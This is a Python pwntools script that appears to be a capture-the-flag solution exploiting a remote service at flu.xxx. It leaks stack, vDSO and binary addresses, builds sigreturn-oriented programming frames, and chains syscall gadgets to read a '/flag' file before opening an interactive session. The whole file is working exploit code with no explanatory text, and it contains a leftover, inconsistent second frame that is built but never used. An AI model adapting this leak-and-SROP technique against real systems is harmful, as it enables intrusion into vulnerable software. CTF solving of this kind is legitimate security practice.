from pwn import *

context.arch = 'amd64'

time_buffer = 1

p = remote("flu.xxx", 10060)

sleep(time_buffer)
p.sendline(b"A"*16)
leak = p.recv()
stack_leak = u64(leak[8:16].ljust(8, b"\x00"))
stack_ret = stack_leak - 0x3d5
stack_space = stack_ret - 0x10000

# vdso_base = u64(leak[80:88].ljust(8, b"\x00")) # docker gdbserver
# exe_leak = u64(leak[160:168].ljust(8, b"\x00")) # docker gdbserver

vdso_base = u64(leak[120:128].ljust(8, b"\x00")) # remote
exe_leak = u64(leak[184:192].ljust(8, b"\x00")) # remote

exe_base = exe_leak - 0x40

log.success(f"{hex(stack_ret)=}")
log.success(f"{hex(stack_space)=}")
log.success(f"{hex(vdso_base)=}")
log.success(f"{hex(exe_base)=}")

# for i in range(0, len(leak), 8):
#     leaks = u64(leak[i:i+8].ljust(8, b"\x00"))
#     log.info(f"{i}: {hex(leaks)}")

inc_rax = exe_base + 0x3c
syscall = exe_base + 0x36

read_frame = SigreturnFrame() # create bigger read cause inefficient inc rax
read_frame.rax = 0  # read
read_frame.rdi = 0  # stdin
read_frame.rsi = stack_space # len of payload
read_frame.rdx = 0x1000
read_frame.r8 = 5
read_frame.rbp = stack_space
read_frame.rsp = stack_space + 0x200
read_frame.rip = syscall

payload = p64(inc_rax)*15
payload += p64(syscall)
payload += bytes(read_frame)
payload += p64(stack_space+0x200)

for i in range(0, len(payload), 8):
    payloads = u64(payload[i:i+8].ljust(8, b"\x00"))
    log.info(f"{int(i/8)}: {hex(payloads)}")

sleep(time_buffer)
p.sendline(b"B"*504 + b"/flag" + b"\x00")
log.info(b"sent two")

sleep(time_buffer)
p.sendline(b"C"*496 + b"r" + b"\x00")
log.info(b"sent three")

sleep(time_buffer)
p.sendline(payload)
log.info(b"sent payload")

open_frame = SigreturnFrame()
open_frame.rax = 0  # read
open_frame.rdi = 0  # stdin
open_frame.rsi = stack_space # len of payload
open_frame.rdx = 0x1000
open_frame.r8 = 5
open_frame.rbp = stack_space + 0x5000
open_frame.rsp = stack_space + 0x5200
open_frame.rip = syscall

sleep(time_buffer)

p.interactive()